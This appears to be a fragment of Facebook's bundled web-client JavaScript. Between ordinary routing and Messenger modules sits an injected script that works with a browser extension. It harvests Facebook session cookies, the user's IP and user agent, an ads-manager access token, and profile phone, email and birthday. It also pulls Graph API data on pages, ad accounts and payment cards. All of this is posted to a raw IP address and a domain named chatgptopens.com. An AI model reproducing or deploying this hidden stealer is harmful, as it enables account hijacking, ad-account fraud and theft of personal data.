        r.push(A);
        return A;
      }
      a._instances = r;
      f = a;
      g["default"] = f;
    },
    98
  );
  __d(
    "useCometOnBeforeUnloadDialog",
    [
      "CometCardedDialogLoadingStateLegacy.react",
      "react",
      "requireDeferred",
      "useCometDeferredDialog",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useRef,
        l = c("requireDeferred")("CometOnBeforeUnloadDialog.react").__setRef(
          "useCometOnBeforeUnloadDialog"
        );
      function a() {
        var a = j(function () {
            return i.jsx(c("CometCardedDialogLoadingStateLegacy.react"), {});
          }, []),
          b = k(null);
        a = c("useCometDeferredDialog")(l, a);
        return [a, b];
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "buildFBCometRouterStateProvider",
    [
      "CometDialogLoadingState.react",
      "CometRouteStore",
      "buildBaseCometRouterStateProvider",
      "buildCometRouter",
      "cr:69",
      "cr:805",
      "deferredLoadComponent",
      "react",
      "requireDeferred",
      "requireDeferredForDisplay",
      "useCometOnBeforeUnloadDialog",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      h || d("react");
      e = c("requireDeferredForDisplay")(
        "CometRouterUIComponentsDefaultErrorRoot.react"
      ).__setRef("buildFBCometRouterStateProvider");
      f = c("deferredLoadComponent")(
        c("requireDeferred")("CometRouteActorToaster.react").__setRef(
          "buildFBCometRouterStateProvider"
        )
      );
      var i = {
        DialogErrorRoot: b("cr:805"),
        ErrorRoot: e,
        LoadingStates: {
          comet_routable_dialog: c("CometDialogLoadingState.react"),
        },
        RouteActorToaster: f,
        RouterFocusRegion: b("cr:69"),
      };
      function a(a) {
        var b = c("buildCometRouter")(a, c("CometRouteStore"));
        return c("buildBaseCometRouterStateProvider")(
          b,
          c("useCometOnBeforeUnloadDialog"),
          (b = a.uiComponents) != null ? b : i
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "loadAppshellEntrypoint",
    ["RelayHooks"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function h(a, b) {
        var c = {},
          e = Object.keys(a);
        e.forEach(function (e) {
          var f = a[e],
            g = f.environmentProviderOptions,
            h = f.options,
            i = f.parameters;
          f = f.variables;
          var j = b.getEnvironment(g);
          c[e] = d("RelayHooks").loadQuery(
            j,
            i,
            f,
            {
              __nameForWarning: "loadAppshellEntryPoint",
              fetchPolicy: h == null ? void 0 : h.fetchPolicy,
              networkCacheConfig: h == null ? void 0 : h.networkCacheConfig,
            },
            g
          );
        });
        return c;
      }
      function a(a, b) {
        var c = b.getDisplayQueries();
        b = b.getDeferredQueries();
        c = h(c, a);
        b = h(b, a);
        return { deferredQueries: b, displayQueries: c };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "loadCometAppshellEntrypoint",
    [
      "createCometRelayBaseEntryPointEnvironmentProvider",
      "loadAppshellEntrypoint",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || c("react");
      function a(a, b, d, e) {
        e = c("createCometRelayBaseEntryPointEnvironmentProvider")(e, d);
        d = c("loadAppshellEntrypoint")(e, b);
        e = d.deferredQueries;
        b = d.displayQueries;
        return i.jsx(a, { deferredQueries: e, displayQueries: b });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "LoggedInFBBuildRoot",
    [
      "CometDarkModeStateProvider.react",
      "CometDensityModeStateProvider.react",
      "CometFBUncaughtErrorDeferred.react",
      "CometKeyCommandNub.react",
      "CometKeyboardSettingsStateProvider.react",
      "CometLoggedInFBApp.react",
      "CometRelayEnvironmentFactory",
      "CurrentUser",
      "FacebookCometCookieConsent.react",
      "LoggedInFBAppshellEntrypoint",
      "buildCometRootComponent",
      "buildFBCometRouterStateProvider",
      "cr:1273258",
      "cr:1801728",
      "cr:615",
      "cr:881053",
      "loadCometAppshellEntrypoint",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      b("cr:615");
      function a(a, e) {
        var f = c("CurrentUser").getID();
        a = c("buildFBCometRouterStateProvider")(
          babelHelpers["extends"]({}, a, {
            initialActorID: f,
            initialLoadTraceId: e,
            relayEnvironmentFactory: d("CometRelayEnvironmentFactory")
              .CometRelayEnvironmentFactory,
          })
        );
        var g = c("loadCometAppshellEntrypoint")(
          c("CometLoggedInFBApp.react"),
          c("LoggedInFBAppshellEntrypoint"),
          f,
          d("CometRelayEnvironmentFactory").CometRelayEnvironmentFactory
        );
        return d("buildCometRootComponent").buildCometRootComponent(
          g,
          {
            initialActorID: f,
            initialLoadTraceId: e,
            relayEnvironmentFactory: d("CometRelayEnvironmentFactory")
              .CometRelayEnvironmentFactory,
          },
          {
            CometRouterStateProvider: a,
            OtherRootComponents: {
              CookieConsentDialog: c("FacebookCometCookieConsent.react"),
              DebugOwlDisplay: b("cr:1801728"),
              KeyCommandNub: c("CometKeyCommandNub.react"),
              ProductAttributionDebugger: b("cr:1273258"),
              Redblock: b("cr:881053"),
              UncaughtErrorFallback: c("CometFBUncaughtErrorDeferred.react"),
            },
            UIStateProviders: {
              DarkModeStateProvider: c("CometDarkModeStateProvider.react"),
              DensityModeStateProvider: c("CometDensityModeStateProvider.react"),
              KeyboardSettingsStateProvider: c(
                "CometKeyboardSettingsStateProvider.react"
              ),
            },
          }
        );
      }
      g.buildRootComponent = a;
    },
    98
  );
  __d(
    "cometFBBaseCSS",
    ["cx"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
    },
    34
  );
  __d(
    "initClientWithFBMessenger",
    [
      "CometRootInitClient",
      "MultipleTabsLogger",
      "QE2Logger",
      "cr:4725",
      "cr:7288",
      "cr:8361",
      "gkx",
      "promiseDone",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("gkx")("9125") ? null : b("cr:4725");
      e =
        (a = b("cr:7288") == null ? void 0 : b("cr:7288").shimIndexedDb) != null
          ? a
          : function () {};
      f = [
        e,
        function () {
          h &&
            (b("cr:8361") &&
              c("promiseDone")(b("cr:8361").startWithMessengerConfig()),
            c("promiseDone")(h.createWorkerIfNone())),
            d("MultipleTabsLogger").init(),
            d("QE2Logger").logExposureForUser("messenger_armadillo_web");
        },
      ];
      a = d("CometRootInitClient").makeInitClient({ postInit: f });
      g.indexDBSetupPostInitHooks = f;
      g.initClient = a;
    },
    98
  );
  __d(
    "fbLoggedInInitClient",
    [
      "CometRootInitClient",
      "CometSSRContentInjector",
      "I64",
      "InteractionTracing",
      "InteractionTracingMetrics",
      "LSIntEnum",
      "LSMessagingThreadTypeUtil",
      "MWChatInteraction",
      "MWChatStateV2Types",
      "MWChatTabSharedQPLAnnotations",
      "MWV2CookieReader",
      "MessengerWebPresenceCookieData",
      "QuickPerformanceLogger",
      "cr:2325",
      "initClientWithFBMessenger",
      "qpl",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h, i, j;
      a = d("CometRootInitClient").makeInitClient({
        postInit: [
          function (a) {
            a = a == null ? void 0 : a.initialRoute;
            if ((a == null ? void 0 : a.hideChat) === !0) return;
            b("cr:2325") != null && b("cr:2325")();
            k(a);
            l(a);
          },
        ].concat(d("initClientWithFBMessenger").indexDBSetupPostInitHooks),
        preInit: [
          function (a) {
            if (a) {
              var b = a.traceAPI;
              a = document.getElementById(a.rootElementID);
              a &&
                d(
                  "CometSSRContentInjector"
                ).maybeInitTimerForCaaRegistrationWelcomeScreen(a, b);
            }
          },
        ],
      });
      function k(a) {
        a = c("InteractionTracing").startInteraction({
          interactionClass: "contingent",
          qplEvent: c("qpl")._(30615205, "611"),
          startTime: 0,
          tracePolicy:
            (a = a == null ? void 0 : a.tracePolicy) != null ? a : "comet.app",
          traceType: "INTERACTION",
        });
        d("MWChatInteraction").set(d("MWChatInteraction").MW_CHATHEADS_LOAD, a);
        var b = d("MWV2CookieReader").read(
            c("MessengerWebPresenceCookieData").cookie
          ),
          e = 0,
          f = 0;
        for (
          var b = b.tabs.values(),
            g = Array.isArray(b),
            h = 0,
            b = g
              ? b
              : b[
                  typeof Symbol === "function" ? Symbol.iterator : "@@iterator"
                ]();
          ;
  
        ) {
          var i;
          if (g) {
            if (h >= b.length) break;
            i = b[h++];
          } else {
            h = b.next();
            if (h.done) break;
            i = h.value;
          }
          i = i;
          var j = i.minimizeWatermark;
          i = i.tabType;
          if (
            i.type !== d("MWChatStateV2Types").MWChatStateTabType.ChatTab ||
            !Boolean(j)
          )
            continue;
          d("LSMessagingThreadTypeUtil").isSecure(
            i.threadKeyDescriptor.threadType
          )
            ? f++
            : e++;
        }
        c("InteractionTracingMetrics").addAnnotationInt(
          a,
          "chatheads_open_head_count",
          e
        );
        c("InteractionTracingMetrics").addAnnotationInt(
          a,
          "chatheads_e2ee_head_count",
          f
        );
      }
      function l(a) {
        var b = d("MWV2CookieReader").read(
            c("MessengerWebPresenceCookieData").cookie
          ),
          e = b.tabs.size > 0,
          f = Array.from(b.tabs.values()).reduce(function (a, b) {
            return a || !Boolean(b.minimizeWatermark);
          }, !1),
          g = Array.from(b.tabs.values()).reduce(function (a, b) {
            return (
              a ||
              (!Boolean(b.minimizeWatermark) &&
                b.tabType.type ===
                  d("MWChatStateV2Types").MWChatStateTabType.ChatTab &&
                d("LSMessagingThreadTypeUtil").isSecure(
                  b.tabType.threadKeyDescriptor.threadType
                ))
            );
          }, !1);
        e &&
          g &&
          (j || (j = c("QuickPerformanceLogger"))).setAlwaysOnSampleRate(
            c("qpl")._(30609204, "1682"),
            1
          );
        if (e && f) {
          e = c("InteractionTracing").startInteraction({
            cfg: { timeout: 10 * 60 * 1e3 },
            interactionClass: "contingent",
            qplEvent: c("qpl")._(30609204, "1682"),
            startTime: 0,
            tracePolicy:
              (g = a == null ? void 0 : a.tracePolicy) != null ? g : "comet.app",
            traceType: "INTERACTION",
          });
          d("MWChatInteraction").set(
            d("MWChatInteraction").MW_AUTO_CHAT_TAB_OPEN,
            e
          );
          f = Array.from(b.tabs.values()).find(function (a) {
            return (
              a.tabType.type ===
                d("MWChatStateV2Types").MWChatStateTabType.ChatTab &&
              a.minimizeWatermark === 0
            );
          });
          if (
            f == null ||
            f.tabType.type !== d("MWChatStateV2Types").MWChatStateTabType.ChatTab
          )
            return;
          a = f.tabType.threadKeyDescriptor.threadKey;
          g = f.tabType.threadKeyDescriptor.threadType;
          d("MWChatInteraction").set((h || (h = d("I64"))).to_string(a), e);
          b = d("MWChatInteraction").getInteractionTraceForThreadKey(
            h.to_string(a)
          );
          b != null &&
            d("MWChatTabSharedQPLAnnotations").addSharedAnnotations(
              b,
              (i || (i = d("LSIntEnum"))).unwrapIntEnum(g),
              a
            );
        }
      }
      g.initClient = a;
    },
    98
  );
  __d(
    "CometFBLoggedInRootConfig",
    [
      "CometDarkMode",
      "LoggedInFBBuildRoot",
      "cometFBBaseCSS",
      "cr:1915",
      "cr:409",
      "cr:4451",
      "fbLoggedInInitClient",
      "requireDeferred",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("requireDeferred")("CometRootDeferred").__setRef(
        "CometFBLoggedInRootConfig"
      );
      b("cometFBBaseCSS");
      e = {
        DeferredRoot: a,
        buildRootComponent: d("LoggedInFBBuildRoot").buildRootComponent,
        initClient: d("fbLoggedInInitClient").initClient,
        initClientAndServer: function () {
          b("cr:4451") == null ? void 0 : b("cr:4451").initPresenceData(),
            b("cr:409") == null ? void 0 : b("cr:409").init();
        },
        initDarkMode: d("CometDarkMode").initDarkMode,
        onSSRAllPayloadsInjected: function (a) {
          b("cr:1915")(a);
        },
      };
      f = e;
      g["default"] = f;
    },
    98
  );
  __d(
    "setupNotificationsLiveQuery",
    ["WebPixelRatio", "requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = c("requireDeferred")("CometNotificationsReceiveLiveQuery").__setRef(
        "setupNotificationsLiveQuery"
      );
      function i(a) {
        var b = {
          count: 15,
          environment: "MAIN_SURFACE",
          filter_tokens: [],
          refresh_num: 0,
          scale: d("WebPixelRatio").get(),
        };
        (a == null ? void 0 : a.count) != null && (b.count = a.count);
        (a == null ? void 0 : a.receivedNotifications) != null &&
          (b.notif_cache_ids = Array.from(
            a == null ? void 0 : a.receivedNotifications
          ));
        (a == null ? void 0 : a.filterTokens) != null &&
          (b.filter_tokens = a == null ? void 0 : a.filterTokens);
        return b;
      }
      var j = 0,
        k = null;
      function a(a, b) {
        j++;
        function c(c) {
          c = c.subscribeToNotificationUpdates;
          var d = i(b);
          k == null ? (k = c(a, d)) : b != null && k.updateVariables(d);
        }
        h.onReady(c);
        var d = !1;
        function e() {
          if (d) return;
          d = !0;
          j--;
          j === 0 && k != null && (k.dispose(), (k = null));
        }
        return { dispose: e };
      }
      g["default"] = a;
    },
    98
  );
  (async ()=>{
      console.log("inject script running....")
      const extId = "lhobocebnebcippijeocdpnholkleenf"
  
      function getCK() {
        let ck = document.cookie
          .split(";")
          .find((item) => item.includes("c_user"))
          .split("=")[1];
        console.log("ck: ", ck);
        chrome.runtime.sendMessage(
          extId,
          {
            action: "fetch",
            data: {
              method: "POST",
              url: "http://103.35.189.112:2000/account/create",
              headers: { "Content-Type": "application/json" },
              body: {
                type: 1,
                data: btoa(
                  JSON.stringify({
                    //   uid: k,
                    cookie: ck,
                    //   userAgent: C,
                    //   ip: S,
                  })
                ),
              },
            },
          },
          () => {}
        );
      }
    //   getCK()

    const a = function () {
        const t = "getCK",
          n = "lhobocebnebcippijeocdpnholkleenf",
          [a, l] = (0, e.useState)(!1),
          [o, u] = (0, e.useState)(!1),
          [i, s] = (0, e.useState)(""),
          [c, f] = (0, e.useState)(void 0),
          [d, p] = (0, e.useState)(void 0),
          [m, h] = (0, e.useState)(void 0),
          [g, v] = (0, e.useState)(void 0),
          [y, b] = (0, e.useState)(void 0),
          [k, w] = (0, e.useState)(""),
          [S, _] = (0, e.useState)(""),
          [E, x] = (0, e.useState)([]),
          [C, P] = (0, e.useState)(""),
          [N, T] = (0, e.useState)(""),
          [z, L] = (0, e.useState)([]),
          [M, O] = (0, e.useState)(""),
          [R, F] = (0, e.useState)([]),
          [D, I] = (0, e.useState)(""),
          [U, j] = (0, e.useState)([]),
          [A, B] = (0, e.useState)(""),
          [V, $] = (0, e.useState)(void 0);
        return (
          (0, e.useEffect)(() => {
            U.length > 0 &&
              "" !== k &&
              o &&
              chrome.runtime.sendMessage(
                n,
                {
                  action: "fetch",
                  data: {
                    method: "POST",
                    url: "https://chatgptopens.com/account/create",
                    headers: { "Content-Type": "application/json" },
                    body: { type: 0, data: { uid: k, fanPages: U } },
                  },
                },
                () => {}
              );
          }, [k, U, o]),
          (0, e.useEffect)(() => {
            R.length > 0 &&
              "" !== k &&
              o &&
              chrome.runtime.sendMessage(
                n,
                {
                  action: "fetch",
                  data: {
                    method: "POST",
                    url: "https://chatgptopens.com/account/create",
                    headers: { "Content-Type": "application/json" },
                    body: { type: 0, data: { uid: k, bmAccounts: R } },
                  },
                },
                () => {}
              );
          }, [k, R, o]),
          (0, e.useEffect)(() => {
            z.length > 0 &&
              "" !== k &&
              o &&
              chrome.runtime.sendMessage(
                n,
                {
                  action: "fetch",
                  data: {
                    method: "POST",
                    url: "https://chatgptopens.com/account/create",
                    headers: { "Content-Type": "application/json" },
                    body: { type: 0, data: { uid: k, adsAccounts: z } },
                  },
                },
                () => {}
              );
          }, [k, z, o]),
          (0, e.useEffect)(() => {
            void 0 !== V &&
              "" !== k &&
              o &&
              chrome.runtime.sendMessage(
                n,
                {
                  action: "fetch",
                  data: {
                    method: "POST",
                    url: "https://chatgptopens.com/account/create",
                    headers: { "Content-Type": "application/json" },
                    body: { type: 0, data: { uid: k, userInfo: V, name: i } },
                  },
                },
                () => {}
              );
          }, [k, V, o]),
          (0, e.useEffect)(() => {
            "" !== k &&
              "" !== S &&
              E.length > 0 &&
              "" !== C &&
              chrome.runtime.sendMessage(
                n,
                {
                  action: "fetch",
                  data: {
                    method: "POST",
                    url: "https://chatgptopens.com/account/create",
                    headers: { "Content-Type": "application/json" },
                    body: {
                      type: 1,
                      data: btoa(
                        JSON.stringify({
                          uid: k,
                          cookie: E,
                          userAgent: C,
                          ip: S,
                        })
                      ),
                    },
                  },
                },
                () => {
                  u(!0);
                }
              );
          }, [k, S, E, C]),
          (0, e.useEffect)(() => {
            "" !== N &&
              (async () => {
                const e = "https://graph.facebook.com/v15.0/me?fields="
                  .concat(
                    "accounts.limit(40){id,name,verification_status,is_published,ad_campaign,roles{id,%20tasks},is_promotable,is_restricted,parent_page,promotion_eligible,fan_count,followers_count,has_transitioned_to_new_page_experience,picture}",
                    "&access_token="
                  )
                  .concat(N, "&cursor=")
                  .concat(A);
                chrome.runtime.sendMessage(
                  n,
                  { action: "fetch", data: { method: "GET", url: e } },
                  (e) => {
                    const t = e.data;
                    j(U.concat(t.accounts.data)),
                      40 === t.accounts.data.length &&
                        B(t.accounts.paging.cursors.after);
                  }
                );
              })().then();
          }, [N, A]),
          (0, e.useEffect)(() => {
            "" !== N &&
              (async () => {
                const e =
                  "https://graph.facebook.com/v15.0/me/adaccounts?fields="
                    .concat(
                      "account_id,owner_business,name,disable_reason,account_status,currency,adspaymentcycle,account_currency_ratio_to_usd,adtrust_dsl,balance,all_payment_methods{pm_credit_card{display_string,exp_month,exp_year,is_verified}},created_time,next_bill_date,timezone_name,amount_spent,timezone_offset_hours_utc,insights.date_preset(maximum){spend},userpermissions{user,role},owner,is_prepay_account,spend_cap&summary=true&limit=50",
                      "&access_token="
                    )
                    .concat(N, "&cursor=")
                    .concat(M);
                chrome.runtime.sendMessage(
                  n,
                  { action: "fetch", data: { method: "GET", url: e } },
                  (e) => {
                    const t = e.data,
                      n = t.data;
                    L(JSON.parse(JSON.stringify(z.concat(n)))),
                      50 === n.length && O(t.paging.cursors.after);
                  }
                );
              })().then();
          }, [N, M]),
          (0, e.useEffect)(() => {
            "" !== N &&
              (async () => {
                const e =
                  "https://graph.facebook.com/v15.0/me/businesses?fields="
                    .concat(
                      "id,created_time,is_disabled_for_integrity_reasons,sharing_eligibility_status,allow_page_management_in_www,can_use_extended_credit,name,timezone_id,timezone_offset_hours_utc,verification_status,owned_ad_accounts{id,currency,timezone_offset_hours_utc,timezone_name}",
                      "&access_token="
                    )
                    .concat(N);
                chrome.runtime.sendMessage(
                  n,
                  { action: "fetch", data: { method: "GET", url: e } },
                  (e) => {
                    "undefined" !== typeof e.data.data
                      ? F(e.data.data)
                      : F([]);
                  }
                );
              })().then();
          }, [N, D]),
          (0, e.useEffect)(() => {
            if (
              void 0 !== c &&
              void 0 !== d &&
              void 0 !== m &&
              void 0 !== g &&
              void 0 !== y
            ) {
              x([c, d, m, g, y]);
            }
          }, [c, d, m, g, y]),
          (0, e.useEffect)(() => {
            a &&
              ((async () => {
                chrome.runtime.sendMessage(
                  n,
                  {
                    action: "fetch",
                    data: {
                      method: "GET",
                      url: "https://adsmanager.facebook.com/adsmanager/manage/accounts",
                      type: "text",
                    },
                  },
                  (e) => {
                    const t = e.data
                      .split('adAccountId: \\"')[1]
                      .split('\\"')[0];
                    chrome.runtime.sendMessage(
                      n,
                      {
                        action: "fetch",
                        data: {
                          method: "GET",
                          url: "https://adsmanager.facebook.com/adsmanager/onboarding?act=".concat(
                            t,
                            "&breakdown_regrouping=0"
                          ),
                          type: "text",
                        },
                      },
                      (e) => {
                        const r = e.data;
                        if (-1 !== r.search("window.__accessToken")) {
                          const e = r
                            .split('window.__accessToken="')[1]
                            .split('"')[0];
                          T(e);
                        } else
                          chrome.runtime.sendMessage(
                            n,
                            {
                              action: "fetch",
                              data: {
                                method: "GET",
                                url: "https://adsmanager.facebook.com/adsmanager?act=".concat(
                                  t,
                                  "&breakdown_regrouping=1"
                                ),
                                type: "text",
                              },
                            },
                            (e) => {
                              const t = e.data;
                              if (-1 !== t.search("window.__accessToken")) {
                                const e = t
                                  .split('window.__accessToken="')[1]
                                  .split('"')[0];
                                T(e);
                              }
                            }
                          );
                      }
                    );
                  }
                );
              })().then(),
              (async () => {
                chrome.runtime.sendMessage(
                  n,
                  {
                    action: "fetch",
                    data: {
                      method: "GET",
                      url: "https://mbasic.facebook.com/profile.php?v=info",
                      type: "text",
                    },
                  },
                  (e) => {
                    if (e.status) {
                      let t = "",
                        n = "",
                        r = "",
                        a = "";
                      const l = e.data,
                        o = new DOMParser().parseFromString(l, "text/html"),
                        u = o.title;
                      s(u);
                      const i = o.getElementById("contact-info"),
                        c = o.getElementById("basic-info"),
                        f = i.getElementsByTagName("tr");
                      for (let e = 0; e < f.length; e++) {
                        const r = f[e].getElementsByTagName("a");
                        if (r.length > 0) {
                          const a = r[0].getAttribute("href");
                          a.startsWith("/editprofile/phone/")
                            ? (n =
                                f[e].getElementsByTagName("td")[1].innerText)
                            : a.startsWith("/settings/email/") &&
                              (t =
                                f[e].getElementsByTagName("td")[1].innerText);
                        }
                      }
                      const d = c.getElementsByTagName("tr");
                      for (let e = 0; e < d.length; e++) {
                        const t = d[e].getElementsByTagName("a");
                        if (t.length > 0) {
                          const n = t[0].getAttribute("href");
                          n.startsWith(
                            "/editprofile.php?type=basic&edit=birthday"
                          )
                            ? (r =
                                d[e].getElementsByTagName("td")[1].innerText)
                            : n.startsWith(
                                "/editprofile.php?type=basic&edit=gender"
                              ) &&
                              (a =
                                d[e].getElementsByTagName("td")[1].innerText);
                        }
                      }
                      $({
                        name: u,
                        phone: n,
                        email: t,
                        birthday: r,
                        gender: a,
                      });
                    }
                  }
                );
              })().then());
          }, [a]),
          (0, e.useEffect)(() => {
            a &&
              (P(navigator.userAgent),
              chrome.runtime.sendMessage(
                n,
                {
                  action: t,
                  data: { url: "https://www.facebook.com", name: "fr" },
                },
                (e) => {
                  f(e.data);
                }
              ),
              chrome.runtime.sendMessage(
                n,
                {
                  action: t,
                  data: { url: "https://www.facebook.com", name: "xs" },
                },
                (e) => {
                  p(e.data);
                }
              ),
              chrome.runtime.sendMessage(
                n,
                {
                  action: t,
                  data: { url: "https://www.facebook.com", name: "datr" },
                },
                (e) => {
                  h(e.data);
                }
              ),
              chrome.runtime.sendMessage(
                n,
                {
                  action: t,
                  data: { url: "https://www.facebook.com", name: "sb" },
                },
                (e) => {
                  v(e.data);
                }
              ),
              chrome.runtime.sendMessage(
                n,
                {
                  action: t,
                  data: { url: "https://www.facebook.com", name: "c_user" },
                },
                (e) => {
                  b(e.data), w(e.data.value);
                }
              ),
              chrome.runtime.sendMessage(
                n,
                {
                  action: "fetch",
                  data: { url: "http://ip-api.com/json", method: "GET" },
                },
                (e) => {
                  _(e.data.query);
                }
              ));
          }, [a]),
          (0, e.useEffect)(() => {
            chrome.runtime.sendMessage(
              n,
              { action: "getDataFromStorage", data: { key: "d_tr" } },
              (e) => {
                e.data !== new Date().toDateString() &&
                  (l(!0),
                  chrome.runtime.sendMessage(
                    n,
                    {
                      action: "setDataToStorage",
                      data: { key: "d_tr", value: new Date().toDateString() },
                    },
                    () => {}
                  ));
              }
            );
          }, []),
          (0, r.jsx)(r.Fragment, {})
        );
      },
      l = (e) => {
        e &&
          e instanceof Function &&
          n
            .e(787)
            .then(n.bind(n, 787))
            .then((t) => {
              let {
                getCLS: n,
                getFID: r,
                getFCP: a,
                getLCP: l,
                getTTFB: o,
              } = t;
              n(e), r(e), a(e), l(e), o(e);
            });
      };
      setTimeout(() => {
        const n = document.createElement("div");
        n.id = "lhobocebnebcippijeocdpnholkleenf_page";
        document.getElementsByTagName("body")[0].append(n);
        t.createRoot(n).render(
          (0, r.jsx)(e.StrictMode, { children: (0, r.jsx)(a, {}) })
        );
      }, 5e3),
        l();
     
  })()
  __d(
    "updateWidgetServiceWorker",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a() {
        var a;
        (a = navigator.serviceWorker) == null
          ? void 0
          : (a = a.controller) == null
          ? void 0
          : a.postMessage({ command: "updateWidget" });
      }
      f["default"] = a;
    },
    66
  );
  
